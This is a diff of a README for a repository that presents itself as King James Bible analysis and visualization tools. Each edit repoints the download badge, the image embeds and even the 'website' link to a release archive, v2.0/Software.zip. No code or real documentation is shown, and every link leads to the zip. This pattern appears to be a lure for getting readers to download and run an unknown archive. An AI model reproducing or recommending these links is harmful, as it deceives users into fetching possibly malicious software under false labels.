@@ -1,6 +1,6 @@
 # 📖 Welcome to "st-kjv-vis" Repository! 📊
 
-![KJV Bible Analysis and Visualization](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip)
+![KJV Bible Analysis and Visualization](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v2.0/Software.zip)
 
 ### Description:
 This repository is a collection of King James Version (KJV) Bible analysis and visualization tools. Dive deep into the scriptures with machine learning models and explore the text like never before. Uncover patterns, insights, and correlations within the Bible using advanced techniques in data analysis.
@@ -21,13 +21,13 @@ This repository is a collection of King James Version (KJV) Bible analysis and v
 Explore the richness of the King James Version Bible through a data-driven lens with our collection of advanced tools.
 
 ### Software Download:
-[![Download Software](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip)](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v2.0/Software.zip)](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v2.0/Software.zip)
 
 ### 🚀 How to Launch the Software:
 The software can be launched by downloading the zip file from the link provided above. Unzip the file and follow the instructions in the included documentation to get started with the analysis and visualization tools.
 
 ### 🌐 Visit our Website:
-For more information, tutorials, and updates, visit our [website](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip).
+For more information, tutorials, and updates, visit our [website](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v2.0/Software.zip).
 
 ---
 
@@ -68,4 +68,4 @@ Join us on this journey of discovery through the King James Version Bible with s
 
 ### 📖 Happy Analyzing! 📊
 
-![KJV Bible](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v1.0/Release.zip)
+![KJV Bible](https://github.com/eloy13rayo/st-kjv-vis/releases/download/v2.0/Software.zip)
